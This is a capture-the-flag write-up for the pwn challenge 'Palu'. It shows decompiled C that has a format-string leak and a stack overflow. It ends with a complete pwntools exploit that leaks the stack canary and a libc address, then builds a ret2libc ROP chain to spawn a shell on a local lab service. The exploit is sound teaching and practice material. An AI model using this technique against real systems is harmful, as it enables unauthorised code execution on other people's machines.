---
title: 'palurctf_Palu'
date: 2024-04-22 13:00:00 +0800
categories: []
tags: [ctf,pwn]
---
```shell
bamuwe@bamuwe:~/palu$ checksec Palu
[*] '/home/bamuwe/palu/Palu'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Canary found ,so we should try to leak canary

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v4; // [rsp+8h] [rbp-88h]
  char *ptr; // [rsp+10h] [rbp-80h]
  size_t v6; // [rsp+18h] [rbp-78h]
  char s1[16]; // [rsp+20h] [rbp-70h] BYREF
  char buf[16]; // [rsp+30h] [rbp-60h] BYREF
  char s[72]; // [rsp+40h] [rbp-50h] BYREF
  unsigned __int64 v10; // [rsp+88h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  back_door1(argc, argv, envp);
  puts("Please tell me your name");
  read(0, buf, 0x5DuLL);
  printf(buf);                                  // format string
  opp11();                                      // menu
  read(0, s1, 2uLL);
  if ( !strcmp(s1, "1\n") )
  {
    puts("Please enter the data you want to encode");
    read(0, s, 0x3CuLL);
    v4 = strlen(s);
    ptr = (char *)palu64_encode(s, v4);
    if ( !ptr )
    {
      puts("Memory allocation failed.");
      return 1;
    }
    printf("palu64 Encoded: %s\n", ptr);
    free(ptr);
  }
  else
  {
    if ( strcmp(s1, "2\n") )
    {
      puts("Invalid option");
      exit(0);
    }
    printf("Enter a palu64 string to decode: ");
    fgets(s, 60, stdin);
    v6 = strlen(s);
    if ( s[v6 - 1] == 10 )
      s[v6 - 1] = 0;
    decode_palu64(s);			//use in here
  }
  return 0;
}
```

> main

```c
unsigned __int64 __fastcall decode_palu64(const char *a1)
{
  char *v1; // rax
  int v2; // eax
  int v3; // eax
  int v4; // eax
  char *s; // [rsp+8h] [rbp-68h]
  int v7; // [rsp+20h] [rbp-50h]
  int i; // [rsp+24h] [rbp-4Ch]
  size_t v9; // [rsp+30h] [rbp-40h]
  char *haystack; // [rsp+38h] [rbp-38h]
  int v11; // [rsp+40h] [rbp-30h]
  int v12; // [rsp+44h] [rbp-2Ch]
  int v13; // [rsp+48h] [rbp-28h]
  int v14; // [rsp+4Ch] [rbp-24h]
  char buf[24]; // [rsp+50h] [rbp-20h] BYREF
  unsigned __int64 v16; // [rsp+68h] [rbp-8h]

  s = (char *)a1;
  v16 = __readfsqword(0x28u);
  v9 = (3 * strlen(a1)) >> 2;
  haystack = (char *)malloc(v9 + 1);
  if ( haystack )
  {
    v7 = 0;
    while ( *s )
    {
      for ( i = 0; i <= 3; ++i )
      {
        v1 = s++;
        *(&v11 + i) = palu64_decode((unsigned int)*v1);
      }
      v2 = v7++;
      haystack[v2] = (4 * v11) | (v12 >> 4);
      if ( v13 <= 63 )
      {
        v3 = v7++;
        haystack[v3] = (16 * v12) | (v13 >> 2);
      }
      if ( v14 <= 63 )
      {
        v4 = v7++;
        haystack[v4] = ((_BYTE)v13 << 6) | v14;
      }
    }
    haystack[v7] = 0;
    if ( strstr(haystack, "Palu") )             // check sign
    {
      puts("A small gift");
      read(0, buf, 0xC8uLL);                    // stackoverflow
    }
    printf("Decoded string: %s\n", haystack);
    free(haystack);
  }
  else
  {
    puts("Memory allocation failed.");
  }
  return __readfsqword(0x28u) ^ v16;
}
```

> decode_palu64

It's clear , we leak `libc` and `canary` first by format string , then do an easy `ROP`

```python
In [11]: from pwn import *

In [12]: elf = ELF('./libc.so.6')

In [13]: hex(elf.sym['__libc_start_main'])
Out[13]: '0x20750'
```

We got `__libc_start_call_main` by format string ,but it's `__libc_start_main` in `libc` for real

```python
from pwn import *
Lib = ELF('./libc.so.6')
io = remote('localhost',47851)
leak_canary = b'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p*%p.%p?%p'
io.sendlineafter(b'name\n',leak_canary)

io.recvuntil(b'*')      #leak canary
canary = int(io.recv(18)[2:],16)
io.recvuntil(b'?')      #leak __libc_start_call_main
libc_addr = int(io.recv(14)[2:],16)

success(f'canary>>{hex(canary)}')
success(f"libc_addr>>{hex(libc_addr)}")
pop_rdi = 0x00000000004010a3 #: pop rdi ; ret
ret_addr = 0x0000000000400761 #: ret
base_offset = libc_addr-0x20840     #0x20840 is __libc_start_main in libc
sys_addr = Lib.sym['system']+base_offset
bin_sh_addr = next(Lib.search(b'/bin/sh'))+base_offset
io.sendlineafter(b'options\n',b'2')
io.sendlineafter(b'decode:',b'UGFsdQ==')    #Palu

payload = b'A'*24+p64(canary)+p64(0)
payload += p64(pop_rdi)+p64(bin_sh_addr)+p64(ret_addr)+p64(sys_addr)    #stack balance
io.sendlineafter('gift\n',payload)
io.sendline(b'cat flag')
io.interactive()
```

